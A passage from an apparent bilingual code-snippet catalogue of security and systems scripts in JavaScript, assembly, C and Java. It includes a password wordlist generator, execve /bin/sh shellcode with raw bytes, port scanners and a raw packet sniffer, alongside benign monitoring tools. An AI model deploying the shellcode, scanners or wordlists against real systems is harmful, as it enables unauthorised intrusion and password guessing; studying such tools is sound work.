    const subs = { a: '@4', e: '3', i: '1!', o: '0', s: '$5', t: '7' };
    let result = word;
    
    for (const [char, replacements] of Object.entries(subs)) {
      for (const rep of replacements) {
        this.words.add(word.replace(new RegExp(char, 'gi'), rep));
      }
    }
  }
  
  // Add common suffixes
  addCommonSuffixes(word) {
    const suffixes = ['!', '!!', '123', '1234', '12345', '@', '#', 
                      '2023', '2024', '2025', '_', '-'];
    suffixes.forEach(s => {
      this.words.add(word + s);
      this.words.add(s + word);
    });
  }
  
  // Generate case variations
  addCaseVariations(word) {
    this.words.add(word.toLowerCase());
    this.words.add(word.toUpperCase());
    this.words.add(word.charAt(0).toUpperCase() + word.slice(1).toLowerCase());
  }
  
  // Generate full wordlist
  generate(baseWords, options = {}) {
    const { numbers = true, leet = true, suffixes = true, cases = true } = options;
    
    this.addWords(baseWords);
    
    baseWords.forEach(word => {
      if (cases) this.addCaseVariations(word);
      if (leet) this.addLeetSpeak(word);
      if (suffixes) this.addCommonSuffixes(word);
    });
    
    return Array.from(this.words);
  }
  
  // Save to file
  save(filename) {
    fs.writeFileSync(filename, Array.from(this.words).join('\\n'));
    console.log(\`[+] Saved \${this.words.size} passwords to \${filename}\`);
  }
}

// Usage
const gen = new WordlistGenerator();
const words = gen.generate(['admin', 'password', 'test', 'user']);
console.log(\`Generated \${words.length} passwords\`);
console.log('Sample:', words.slice(0, 10));`,
  },
  // Assembly Scripts - Low Level Hacking
  {
    name: { ar: "حاقن Shellcode", en: "Shellcode Injector" },
    description: { ar: "حقن كود تنفيذي في الذاكرة مباشرة", en: "Inject executable code directly into memory" },
    language: "Assembly",
    code: `; x86-64 Linux Shellcode Injector
; Executes /bin/sh shell
; nasm -f elf64 shellcode.asm -o shellcode.o
; ld shellcode.o -o shellcode

section .text
    global _start

_start:
    ; Clear registers
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx

    ; Push null terminator
    push rax

    ; Push "/bin//sh" (8 bytes aligned)
    mov rdi, 0x68732f2f6e69622f  ; "/bin//sh" in little endian
    push rdi

    ; Set up execve syscall
    mov rdi, rsp        ; rdi = pointer to "/bin//sh"
    push rax            ; null for envp
    push rdi            ; argv[0] = "/bin//sh"
    mov rsi, rsp        ; rsi = argv

    ; execve syscall number = 59
    mov al, 59
    syscall

    ; Exit if execve fails
    xor rdi, rdi
    mov al, 60          ; exit syscall
    syscall

; Shellcode bytes:
; \\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2
; \\x50\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57
; \\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05
; \\x48\\x31\\xff\\xb0\\x3c\\x0f\\x05`,
  },
  {
    name: { ar: "قراءة سجلات المعالج", en: "CPU Register Reader" },
    description: { ar: "قراءة وعرض قيم سجلات المعالج الأساسية", en: "Read and display CPU register values" },
    language: "Assembly",
    code: `; x86-64 CPU Register Dump
; Displays all general purpose register values
; nasm -f elf64 regdump.asm && ld regdump.o -o regdump

section .data
    rax_msg db "RAX: ", 0
    rbx_msg db "RBX: ", 0
    rcx_msg db "RCX: ", 0
    rdx_msg db "RDX: ", 0
    newline db 10, 0
    hex_chars db "0123456789ABCDEF", 0

section .bss
    hex_buffer resb 17          ; 16 hex chars + null

section .text
    global _start

_start:
    ; Save register values
    push rbx
    push rcx
    push rdx

    ; Print RAX
    lea rsi, [rax_msg]
    call print_string
    mov rdi, rax
    call print_hex
    call print_newline

    ; Print RBX
    lea rsi, [rbx_msg]
    call print_string
    pop rdi                     ; restore RBX value
    call print_hex
    call print_newline

    ; Exit
    mov rax, 60
    xor rdi, rdi
    syscall

print_string:
    ; Print null-terminated string at RSI
    mov rax, 1                  ; sys_write
    mov rdi, 1                  ; stdout
    mov rdx, 5                  ; length
    syscall
    ret

print_hex:
    ; Convert RDI to hex string
    lea rsi, [hex_buffer + 16]
    mov byte [rsi], 0           ; null terminator
    mov rcx, 16

.hex_loop:
    dec rsi
    mov rax, rdi
    and rax, 0xF
    lea rbx, [hex_chars]
    mov al, [rbx + rax]
    mov [rsi], al
    shr rdi, 4
    loop .hex_loop

    ; Print hex string
    mov rax, 1
    mov rdi, 1
    mov rdx, 16
    syscall
    ret

print_newline:
    lea rsi, [newline]
    mov rax, 1
    mov rdi, 1
    mov rdx, 1
    syscall
    ret`,
  },
  {
    name: { ar: "ماسح منافذ منخفض المستوى", en: "Low-Level Port Scanner" },
    description: { ar: "فحص المنافذ باستخدام استدعاءات النظام مباشرة", en: "Port scanning using direct system calls" },
    language: "Assembly",
    code: `; x86-64 Linux TCP Port Scanner
; Scans ports using raw syscalls
; nasm -f elf64 portscan.asm && ld portscan.o -o portscan

section .data
    open_msg    db "Port OPEN: ", 0
    target_ip   dd 0x0100007f           ; 127.0.0.1 in network byte order
    
section .bss
    sockfd      resq 1
    sockaddr    resb 16
    port_num    resw 1

section .text
    global _start

_start:
    mov r12, 1                          ; start port
    mov r13, 1024                       ; end port

scan_loop:
    cmp r12, r13
    jg exit_program

    ; Create socket
    ; socket(AF_INET, SOCK_STREAM, 0)
    mov rax, 41                         ; sys_socket
    mov rdi, 2                          ; AF_INET
    mov rsi, 1                          ; SOCK_STREAM
    xor rdx, rdx
    syscall
    
    test rax, rax
    js next_port
    mov [sockfd], rax

    ; Build sockaddr_in structure
    lea rdi, [sockaddr]
    mov word [rdi], 2                   ; AF_INET
    
    ; Convert port to network byte order
    mov ax, r12w
    xchg al, ah
    mov [rdi + 2], ax                   ; port
    
    mov eax, [target_ip]
    mov [rdi + 4], eax                  ; IP address

    ; connect(sockfd, sockaddr, 16)
    mov rax, 42                         ; sys_connect
    mov rdi, [sockfd]
    lea rsi, [sockaddr]
    mov rdx, 16
    syscall

    ; Check if connection successful
    test rax, rax
    jnz close_sock

    ; Port is open - print message
    mov rax, 1                          ; sys_write
    mov rdi, 1                          ; stdout
    lea rsi, [open_msg]
    mov rdx, 11
    syscall

    ; Print port number (simplified)
    mov rax, r12
    ; (would need to convert to string here)

close_sock:
    mov rax, 3                          ; sys_close
    mov rdi, [sockfd]
    syscall

next_port:
    inc r12
    jmp scan_loop

exit_program:
    mov rax, 60                         ; sys_exit
    xor rdi, rdi
    syscall`,
  },
  {
    name: { ar: "مولد أرقام عشوائية آمن", en: "Secure Random Generator" },
    description: { ar: "توليد أرقام عشوائية باستخدام مصادر عشوائية للنظام", en: "Generate random numbers using system entropy sources" },
    language: "Assembly",
    code: `; x86-64 Cryptographically Secure Random Generator
; Uses /dev/urandom for entropy
; nasm -f elf64 random.asm && ld random.o -o random

section .data
    urandom_path db "/dev/urandom", 0
    hex_chars    db "0123456789abcdef", 0
    newline      db 10

section .bss
    random_buf   resb 32                ; 32 bytes of random data
    hex_output   resb 65                ; 64 hex chars + newline
    fd           resq 1

section .text
    global _start

_start:
    ; Open /dev/urandom
    mov rax, 2                          ; sys_open
    lea rdi, [urandom_path]
    xor rsi, rsi                        ; O_RDONLY
    syscall
    
    test rax, rax
    js exit_error
    mov [fd], rax

    ; Read 32 random bytes
    mov rax, 0                          ; sys_read
    mov rdi, [fd]
    lea rsi, [random_buf]
    mov rdx, 32
    syscall

    ; Close file
    mov rax, 3                          ; sys_close
    mov rdi, [fd]
    syscall

    ; Convert to hex
    lea rsi, [random_buf]
    lea rdi, [hex_output]
    mov rcx, 32

convert_loop:
    movzx eax, byte [rsi]
    
    ; High nibble
    mov edx, eax
    shr edx, 4
    lea rbx, [hex_chars]
    mov dl, [rbx + rdx]
    mov [rdi], dl
    inc rdi
    
    ; Low nibble
    and eax, 0x0F
    mov al, [rbx + rax]
    mov [rdi], al
    inc rdi
    
    inc rsi
    loop convert_loop

    ; Add newline
    mov byte [rdi], 10

    ; Print result
    mov rax, 1                          ; sys_write
    mov rdi, 1                          ; stdout
    lea rsi, [hex_output]
    mov rdx, 65
    syscall

    ; Exit success
    mov rax, 60
    xor rdi, rdi
    syscall

exit_error:
    mov rax, 60
    mov rdi, 1
    syscall`,
  },
  {
    name: { ar: "كاشف Rootkit", en: "Rootkit Detector" },
    description: { ar: "فحص استدعاءات النظام للكشف عن التلاعب", en: "Check syscall table for tampering detection" },
    language: "Assembly",
    code: `; x86-64 Syscall Table Integrity Checker
; Detects syscall hooking by rootkits
; Note: Requires elevated privileges

section .data
    msg_check   db "[*] Checking syscall integrity...", 10, 0
    msg_ok      db "[+] Syscall appears normal", 10, 0
    msg_hook    db "[!] WARNING: Possible syscall hook detected!", 10, 0
    
    ; Known good syscall addresses would be stored here
    ; In practice, you'd compare against known kernel values
    
section .bss
    sys_call_table  resq 1
    current_addr    resq 1

section .text
    global _start

_start:
    ; Print checking message
    mov rax, 1
    mov rdi, 1
    lea rsi, [msg_check]
    mov rdx, 35
    syscall

    ; Method 1: Check syscall return timing
    ; Hooked syscalls often have timing anomalies
    
    rdtsc                               ; Read timestamp counter
    mov r12, rax                        ; Save start time
    
    ; Execute a benign syscall (getpid)
    mov rax, 39                         ; sys_getpid
    syscall
    mov r13, rax                        ; Save PID
    
    rdtsc                               ; Read timestamp again
    sub rax, r12                        ; Calculate elapsed cycles
    
    ; If elapsed > threshold, might be hooked
    ; Normal getpid: ~100-500 cycles
    ; Hooked: typically >10000 cycles
    cmp rax, 5000
    ja possible_hook

    ; Method 2: Check syscall consistency
    ; Call same syscall multiple times
    mov rcx, 10
    mov r14, r13                        ; Expected PID

consistency_check:
    push rcx
    mov rax, 39                         ; sys_getpid again
    syscall
    pop rcx
    
    cmp rax, r14
    jne possible_hook                   ; PID changed = suspicious
    
    loop consistency_check

    ; All checks passed
    mov rax, 1
    mov rdi, 1
    lea rsi, [msg_ok]
    mov rdx, 28
    syscall
    jmp exit_clean

possible_hook:
    mov rax, 1
    mov rdi, 1
    lea rsi, [msg_hook]
    mov rdx, 45
    syscall

exit_clean:
    mov rax, 60
    xor rdi, rdi
    syscall`,
  },
  // C Language Scripts
  {
    name: { ar: "ماسح المنافذ (C)", en: "Port Scanner (C)" },
    description: { ar: "ماسح منافذ سريع ومنخفض المستوى", en: "Fast low-level port scanner" },
    language: "C",
    code: `#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

#define TIMEOUT_SEC 1

int scan_port(const char *ip, int port) {
    int sock;
    struct sockaddr_in addr;
    struct timeval timeout;
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    // Set timeout
    timeout.tv_sec = TIMEOUT_SEC;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    int result = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    close(sock);
    
    return (result == 0) ? 1 : 0;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <target_ip>\\n", argv[0]);
        return 1;
    }
    
    printf("\\n[*] Scanning %s...\\n\\n", argv[1]);
    
    for (int port = 1; port <= 1024; port++) {
        if (scan_port(argv[1], port)) {
            printf("[+] Port %d is OPEN\\n", port);
        }
    }
    
    printf("\\n[*] Scan complete\\n");
    return 0;
}`,
  },
  {
    name: { ar: "مستخرج العمليات", en: "Process Extractor" },
    description: { ar: "استخراج معلومات العمليات من النظام", en: "Extract process information from system" },
    language: "C",
    code: `#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <ctype.h>

typedef struct {
    int pid;
    char name[256];
    char state;
    int ppid;
    long memory_kb;
} ProcessInfo;

int is_numeric(const char *str) {
    while (*str) {
        if (!isdigit(*str)) return 0;
        str++;
    }
    return 1;
}

int get_process_info(int pid, ProcessInfo *info) {
    char path[64];
    char line[512];
    FILE *fp;
    
    info->pid = pid;
    
    snprintf(path, sizeof(path), "/proc/%d/stat", pid);
    fp = fopen(path, "r");
    if (!fp) return -1;
    
    if (fgets(line, sizeof(line), fp)) {
        sscanf(line, "%d (%[^)]) %c %d",
               &info->pid, info->name, &info->state, &info->ppid);
    }
    fclose(fp);
    
    // Get memory info
    snprintf(path, sizeof(path), "/proc/%d/statm", pid);
    fp = fopen(path, "r");
    if (fp) {
        long pages;
        fscanf(fp, "%ld", &pages);
        info->memory_kb = pages * 4; // Assuming 4KB page size
        fclose(fp);
    }
    
    return 0;
}

int main() {
    DIR *dir;
    struct dirent *entry;
    ProcessInfo info;
    
    printf("\\n%-8s %-20s %-6s %-8s %s\\n", 
           "PID", "NAME", "STATE", "PPID", "MEMORY(KB)");
    printf("%-8s %-20s %-6s %-8s %s\\n",
           "---", "----", "-----", "----", "----------");
    
    dir = opendir("/proc");
    if (!dir) {
        perror("Cannot open /proc");
        return 1;
    }
    
    while ((entry = readdir(dir)) != NULL) {
        if (is_numeric(entry->d_name)) {
            int pid = atoi(entry->d_name);
            if (get_process_info(pid, &info) == 0) {
                printf("%-8d %-20s %-6c %-8d %ld\\n",
                       info.pid, info.name, info.state, 
                       info.ppid, info.memory_kb);
            }
        }
    }
    
    closedir(dir);
    return 0;
}`,
  },
  {
    name: { ar: "كاشف الاتصالات الشبكية", en: "Network Connection Detector" },
    description: { ar: "كشف جميع الاتصالات النشطة", en: "Detect all active network connections" },
    language: "C",
    code: `#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>

typedef struct {
    char local_addr[64];
    int local_port;
    char remote_addr[64];
    int remote_port;
    char state[16];
} Connection;

void hex_to_ip(const char *hex, char *ip) {
    unsigned int a, b, c, d;
    sscanf(hex, "%2X%2X%2X%2X", &d, &c, &b, &a);
    sprintf(ip, "%u.%u.%u.%u", a, b, c, d);
}

const char* get_state_name(int state) {
    static const char *states[] = {
        "", "ESTABLISHED", "SYN_SENT", "SYN_RECV",
        "FIN_WAIT1", "FIN_WAIT2", "TIME_WAIT", "CLOSE",
        "CLOSE_WAIT", "LAST_ACK", "LISTEN", "CLOSING"
    };
    if (state >= 1 && state <= 11) return states[state];
    return "UNKNOWN";
}

void parse_connections(const char *file, const char *proto) {
    FILE *fp = fopen(file, "r");
    if (!fp) return;
    
    char line[512];
    fgets(line, sizeof(line), fp); // Skip header
    
    while (fgets(line, sizeof(line), fp)) {
        char local_hex[16], remote_hex[16];
        int local_port, remote_port, state;
        
        sscanf(line, "%*d: %8[^:]:%X %8[^:]:%X %X",
               local_hex, &local_port, remote_hex, &remote_port, &state);
        
        char local_ip[32], remote_ip[32];
        hex_to_ip(local_hex, local_ip);
        hex_to_ip(remote_hex, remote_ip);
        
        printf("%-5s %-22s %-22s %s\\n",
               proto,
               local_ip, 
               remote_ip,
               get_state_name(state));
    }
    
    fclose(fp);
}

int main() {
    printf("\\n%-5s %-22s %-22s %s\\n", 
           "PROTO", "LOCAL", "REMOTE", "STATE");
    printf("%-5s %-22s %-22s %s\\n",
           "-----", "-----", "------", "-----");
    
    parse_connections("/proc/net/tcp", "TCP");
    parse_connections("/proc/net/udp", "UDP");
    
    return 0;
}`,
  },
  {
    name: { ar: "مراقب الملفات", en: "File Monitor" },
    description: { ar: "مراقبة التغييرات في الملفات", en: "Monitor file changes in real-time" },
    language: "C",
    code: `#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <unistd.h>
#include <time.h>

#define EVENT_SIZE (sizeof(struct inotify_event))
#define BUF_LEN (1024 * (EVENT_SIZE + 16))

const char* get_event_type(uint32_t mask) {
    if (mask & IN_CREATE) return "CREATED";
    if (mask & IN_DELETE) return "DELETED";
    if (mask & IN_MODIFY) return "MODIFIED";
    if (mask & IN_MOVED_FROM) return "MOVED_FROM";
    if (mask & IN_MOVED_TO) return "MOVED_TO";
    if (mask & IN_ACCESS) return "ACCESSED";
    if (mask & IN_OPEN) return "OPENED";
    if (mask & IN_CLOSE) return "CLOSED";
    return "UNKNOWN";
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <directory>\\n", argv[0]);
        return 1;
    }
    
    int fd = inotify_init();
    if (fd < 0) {
        perror("inotify_init");
        return 1;
    }
    
    int wd = inotify_add_watch(fd, argv[1], 
        IN_CREATE | IN_DELETE | IN_MODIFY | IN_MOVED_FROM | IN_MOVED_TO);
    
    if (wd < 0) {
        perror("inotify_add_watch");
        return 1;
    }
    
    printf("[*] Monitoring: %s\\n", argv[1]);
    printf("[*] Press Ctrl+C to stop\\n\\n");
    
    char buffer[BUF_LEN];
    
    while (1) {
        int length = read(fd, buffer, BUF_LEN);
        if (length < 0) break;
        
        int i = 0;
        while (i < length) {
            struct inotify_event *event = (struct inotify_event*)&buffer[i];
            
            if (event->len) {
                time_t now = time(NULL);
                struct tm *t = localtime(&now);
                
                printf("[%02d:%02d:%02d] %-12s %s%s\\n",
                       t->tm_hour, t->tm_min, t->tm_sec,
                       get_event_type(event->mask),
                       event->name,
                       (event->mask & IN_ISDIR) ? "/" : "");
            }
            
            i += EVENT_SIZE + event->len;
        }
    }
    
    inotify_rm_watch(fd, wd);
    close(fd);
    
    return 0;
}`,
  },
  {
    name: { ar: "مُحلل حزم الشبكة", en: "Network Packet Analyzer" },
    description: { ar: "التقاط وتحليل حزم الشبكة", en: "Capture and analyze network packets" },
    language: "C",
    code: `#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>

void print_ip_header(struct iphdr *ip) {
    struct in_addr src, dst;
    src.s_addr = ip->saddr;
    dst.s_addr = ip->daddr;
    
    printf("  IP: %s -> %s", inet_ntoa(src), inet_ntoa(dst));
    printf(" | TTL: %d | Proto: ", ip->ttl);
    
    switch (ip->protocol) {
        case IPPROTO_TCP: printf("TCP"); break;
        case IPPROTO_UDP: printf("UDP"); break;
        case IPPROTO_ICMP: printf("ICMP"); break;
        default: printf("%d", ip->protocol);
    }
    printf("\\n");
}

void print_tcp_header(struct tcphdr *tcp) {
    printf("  TCP: Port %d -> %d | ", 
           ntohs(tcp->source), ntohs(tcp->dest));
    
    if (tcp->syn) printf("SYN ");
    if (tcp->ack) printf("ACK ");
    if (tcp->fin) printf("FIN ");
    if (tcp->rst) printf("RST ");
    if (tcp->psh) printf("PSH ");
    printf("| Seq: %u\\n", ntohl(tcp->seq));
}

void print_udp_header(struct udphdr *udp) {
    printf("  UDP: Port %d -> %d | Len: %d\\n",
           ntohs(udp->source), ntohs(udp->dest), ntohs(udp->len));
}

int main() {
    int sock;
    unsigned char buffer[65536];
    struct sockaddr saddr;
    socklen_t saddr_len = sizeof(saddr);
    
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket creation failed (need root)");
        return 1;
    }
    
    printf("[*] Packet sniffer started...\\n");
    printf("[*] Press Ctrl+C to stop\\n\\n");
    
    int count = 0;
    while (count < 100) {
        int data_size = recvfrom(sock, buffer, sizeof(buffer), 0, 
                                  &saddr, &saddr_len);
        if (data_size < 0) continue;
        
        struct iphdr *ip = (struct iphdr*)buffer;
        
        printf("[Packet #%d]\\n", ++count);
        print_ip_header(ip);
        
        if (ip->protocol == IPPROTO_TCP) {
            struct tcphdr *tcp = (struct tcphdr*)(buffer + ip->ihl * 4);
            print_tcp_header(tcp);
        } else if (ip->protocol == IPPROTO_UDP) {
            struct udphdr *udp = (struct udphdr*)(buffer + ip->ihl * 4);
            print_udp_header(udp);
        }
        printf("\\n");
    }
    
  close(sock);
    return 0;
}`,
  },
  // Java Scripts - أفكار جديدة ومميزة
  {
    name: { ar: "محلل الـ Class Files", en: "Java Bytecode Analyzer" },
    description: { ar: "تحليل ملفات .class واستخراج المعلومات المخفية", en: "Analyze .class files and extract hidden information" },
    language: "Java",
    code: `import java.io.*;
import java.util.*;

public class BytecodeAnalyzer {
    
    public static void analyzeClassFile(String path) throws IOException {
        DataInputStream dis = new DataInputStream(
            new FileInputStream(path));
        
        // Magic number (CAFEBABE)
        int magic = dis.readInt();
        if (magic != 0xCAFEBABE) {
            System.out.println("[!] Not a valid Java class file!");
            return;
        }
        
        int minorVersion = dis.readUnsignedShort();
        int majorVersion = dis.readUnsignedShort();
        
        System.out.println("=== Java Class Analysis ===");
        System.out.println("[+] Magic: 0xCAFEBABE (Valid)");
        System.out.println("[+] Java Version: " + getJavaVersion(majorVersion));
        System.out.println("[+] Minor: " + minorVersion + ", Major: " + majorVersion);
        
        // Constant Pool
        int constantPoolCount = dis.readUnsignedShort();
        System.out.println("[+] Constant Pool Size: " + (constantPoolCount - 1));
        
        // Extract strings from constant pool
        List<String> strings = extractStrings(path);
        System.out.println("\\n[*] Found " + strings.size() + " strings:");
        for (String s : strings) {
            if (s.length() > 3 && s.length() < 100) {
                System.out.println("    -> " + s);
            }
        }
        
        dis.close();
    }
    
    static String getJavaVersion(int major) {
        return switch (major) {
            case 52 -> "Java 8";
            case 55 -> "Java 11";
            case 61 -> "Java 17";
            case 65 -> "Java 21";
            default -> "Java " + (major - 44);
        };
    }
    
    static List<String> extractStrings(String path) throws IOException {
        // Simple string extraction using regex-like scanning
        List<String> result = new ArrayList<>();
        byte[] data = java.nio.file.Files.readAllBytes(
            java.nio.file.Paths.get(path));
        
        StringBuilder current = new StringBuilder();
        for (byte b : data) {
            if (b >= 32 && b <= 126) {
                current.append((char) b);
            } else {
                if (current.length() > 4) {
                    result.add(current.toString());
                }
                current = new StringBuilder();
            }
        }
        return result;
    }
    
    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            System.out.println("Usage: java BytecodeAnalyzer <file.class>");
            return;
        }
        analyzeClassFile(args[0]);
    }
}`,
  },
  {
    name: { ar: "كاشف الـ Memory Leaks", en: "Memory Leak Hunter" },
    description: { ar: "تتبع الكائنات في الذاكرة وكشف التسريبات", en: "Track objects in memory and detect leaks" },
    language: "Java",
    code: `import java.lang.ref.*;
import java.util.*;
import java.util.concurrent.*;

public class MemoryLeakHunter {
    
    private static Map<String, WeakReference<Object>> trackedObjects = 
        new ConcurrentHashMap<>();
    private static Map<String, String> allocationSites = new HashMap<>();
    private static ReferenceQueue<Object> refQueue = new ReferenceQueue<>();
    
    public static void track(Object obj, String tag) {
        String id = tag + "_" + System.identityHashCode(obj);
        trackedObjects.put(id, new WeakReference<>(obj, refQueue));
        allocationSites.put(id, getStackTrace());
        System.out.println("[TRACK] " + id + " - " + obj.getClass().getSimpleName());
    }
    
    private static String getStackTrace() {
        StackTraceElement[] stack = Thread.currentThread().getStackTrace();
        StringBuilder sb = new StringBuilder();
        for (int i = 3; i < Math.min(stack.length, 6); i++) {
            sb.append("  at ").append(stack[i]).append("\\n");
        }
        return sb.toString();
    }
    
    public static void analyze() {
        System.gc();
        try { Thread.sleep(100); } catch (Exception e) {}
        
        System.out.println("\\n=== Memory Leak Analysis ===");
        
        int leaked = 0;
        int collected = 0;
        
        for (Map.Entry<String, WeakReference<Object>> entry : 
             trackedObjects.entrySet()) {
            if (entry.getValue().get() != null) {
                leaked++;
                System.out.println("[!] POTENTIAL LEAK: " + entry.getKey());
                System.out.println(allocationSites.get(entry.getKey()));
            } else {
                collected++;
            }
        }
        
        System.out.println("\\n[*] Summary:");
        System.out.println("    Tracked: " + trackedObjects.size());
        System.out.println("    Collected: " + collected);
        System.out.println("    Potential Leaks: " + leaked);
        
        if (leaked > 0) {
            System.out.println("\\n[!] WARNING: Memory leaks detected!");
        } else {
            System.out.println("\\n[+] No memory leaks detected");
        }
    }
    
    // Demo usage
    public static void main(String[] args) {
        List<byte[]> leakyList = new ArrayList<>();
        
        for (int i = 0; i < 5; i++) {
            byte[] data = new byte[1024];
            track(data, "buffer");
            leakyList.add(data); // This causes a leak!
        }
        
        for (int i = 0; i < 5; i++) {
            byte[] temp = new byte[1024];
            track(temp, "temp");
            // temp goes out of scope - no leak
        }
        
        analyze();
    }
}`,
  },
  {
    name: { ar: "مولد الـ Payload الديناميكي", en: "Dynamic Payload Generator" },
    description: { ar: "توليد وتحميل كود Java أثناء التشغيل", en: "Generate and load Java code at runtime" },
    language: "Java",
    code: `import javax.tools.*;
import java.io.*;
import java.net.*;
import java.util.*;
import java.lang.reflect.*;

public class DynamicPayloadGenerator {
    
    public static Class<?> compileAndLoad(String className, String code) 
            throws Exception {
        
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        DiagnosticCollector<JavaFileObject> diagnostics = 
            new DiagnosticCollector<>();
        
        // In-memory source
        JavaFileObject source = new SimpleJavaFileObject(
            URI.create("string:///" + className + ".java"),
            JavaFileObject.Kind.SOURCE) {
            @Override
            public CharSequence getCharContent(boolean ignore) {
                return code;
            }
        };
        
        // In-memory class storage
        Map<String, byte[]> classBytes = new HashMap<>();
        JavaFileManager fileManager = new ForwardingJavaFileManager<>(
            compiler.getStandardFileManager(null, null, null)) {
            @Override
            public JavaFileObject getJavaFileForOutput(Location loc, 
                    String name, JavaFileObject.Kind kind, FileObject s) {
                return new SimpleJavaFileObject(
                    URI.create("mem:///" + name + ".class"), kind) {
                    @Override
                    public OutputStream openOutputStream() {
                        return new ByteArrayOutputStream() {
                            @Override
                            public void close() throws IOException {
                                classBytes.put(name, toByteArray());
                            }
                        };
                    }
                };
            }
        };
        
        compiler.getTask(null, fileManager, diagnostics, null, null, 
            List.of(source)).call();
        
        // Custom classloader
        ClassLoader loader = new ClassLoader() {
            @Override
            protected Class<?> findClass(String name) {
                byte[] bytes = classBytes.get(name);
                return defineClass(name, bytes, 0, bytes.length);
            }
        };
        
        return loader.loadClass(className);
    }
    
    public static void main(String[] args) throws Exception {
        System.out.println("[*] Dynamic Payload Generator");
        System.out.println("[*] Generating runtime code...\\n");
        
        String payload = \"\"\"
            public class RuntimePayload {
                public static String execute(String input) {
                    StringBuilder result = new StringBuilder();
                    result.append("[*] System: " + System.getProperty("os.name"));
                    result.append("\\\\n[*] User: " + System.getProperty("user.name"));
                    result.append("\\\\n[*] Input: " + input);
                    result.append("\\\\n[*] Hash: " + input.hashCode());
                    return result.toString();
                }
            }
            \"\"\";
        
        Class<?> clazz = compileAndLoad("RuntimePayload", payload);
        Method method = clazz.getMethod("execute", String.class);
        
        String result = (String) method.invoke(null, "test_data");
        System.out.println(result);
    }
}`,
  },
  {
    name: { ar: "محاكي الـ Sandbox", en: "Security Sandbox Simulator" },
    description: { ar: "تشغيل كود Java في بيئة معزولة", en: "Run Java code in isolated environment" },
    language: "Java",
    code: `import java.security.*;
import java.io.*;
import java.util.concurrent.*;

public class SandboxSimulator {
    
    static class RestrictedSecurityManager extends SecurityManager {
        private Set<String> allowedActions = Set.of("getProperty");
        
        @Override
        public void checkPermission(Permission perm) {
            String action = perm.getActions();
            String name = perm.getName();
            
            // Log all permission requests
            System.out.println("[SANDBOX] Check: " + perm.getClass().getSimpleName() 
                + " - " + name + " (" + action + ")");
            
            // Block dangerous operations
            if (perm instanceof FilePermission) {
                throw new SecurityException("File access blocked: " + name);
            }
            if (perm instanceof RuntimePermission) {
                if (name.contains("exec") || name.contains("exit")) {
                    throw new SecurityException("Runtime blocked: " + name);
                }
            }
            if (perm instanceof java.net.SocketPermission) {
                throw new SecurityException("Network access blocked: " + name);
            }
        }
        
        @Override
        public void checkExit(int status) {
            throw new SecurityException("System.exit() is blocked!");
        }
    }
    
    public static void runInSandbox(Runnable code, int timeoutMs) {
        System.out.println("=== Sandbox Execution ===\\n");
        
        SecurityManager oldSm = System.getSecurityManager();
        System.setSecurityManager(new RestrictedSecurityManager());
        
        ExecutorService executor = Executors.newSingleThreadExecutor();
        Future<?> future = executor.submit(() -> {
            try {
                code.run();
            } catch (SecurityException e) {
                System.out.println("[BLOCKED] " + e.getMessage());
            }
        });
        
        try {
            future.get(timeoutMs, TimeUnit.MILLISECONDS);
            System.out.println("\\n[+] Execution completed");
        } catch (TimeoutException e) {
            future.cancel(true);
            System.out.println("\\n[!] Execution timeout!");
        } catch (Exception e) {
            System.out.println("\\n[!] Error: " + e.getMessage());
        }
        
        executor.shutdownNow();
        System.setSecurityManager(oldSm);
    }
    
    public static void main(String[] args) {
        // Test various operations in sandbox
        runInSandbox(() -> {
            System.out.println("[*] Getting system property...");
            System.out.println("    OS: " + System.getProperty("os.name"));
            
            System.out.println("\\n[*] Trying to read file...");
            try {
                new FileInputStream("/etc/passwd");
            } catch (Exception e) {}
            
            System.out.println("\\n[*] Trying to execute command...");
            try {
                Runtime.getRuntime().exec("whoami");
            } catch (Exception e) {}
            
        }, 5000);
    }
}`,
  },
  {
    name: { ar: "محلل Thread Dumps", en: "Thread Dump Analyzer" },
    description: { ar: "تحليل حالة الـ Threads وكشف الـ Deadlocks", en: "Analyze thread states and detect deadlocks" },
    language: "Java",
    code: `import java.lang.management.*;
import java.util.*;

public class ThreadDumpAnalyzer {
    
    public static void analyzeThreads() {
        ThreadMXBean threadMXBean = ManagementFactory.getThreadMXBean();
        
        System.out.println("=== Thread Dump Analysis ===\\n");
        
        // Get all threads
        long[] threadIds = threadMXBean.getAllThreadIds();
        ThreadInfo[] threadInfos = threadMXBean.getThreadInfo(threadIds, 10);
        
        Map<Thread.State, Integer> stateCount = new EnumMap<>(Thread.State.class);
        List<ThreadInfo> blockedThreads = new ArrayList<>();
        
        System.out.println("[*] Active Threads: " + threadIds.length + "\\n");
        
        for (ThreadInfo info : threadInfos) {
            if (info == null) continue;
            
            Thread.State state = info.getThreadState();
            stateCount.merge(state, 1, Integer::sum);
            
            if (state == Thread.State.BLOCKED) {
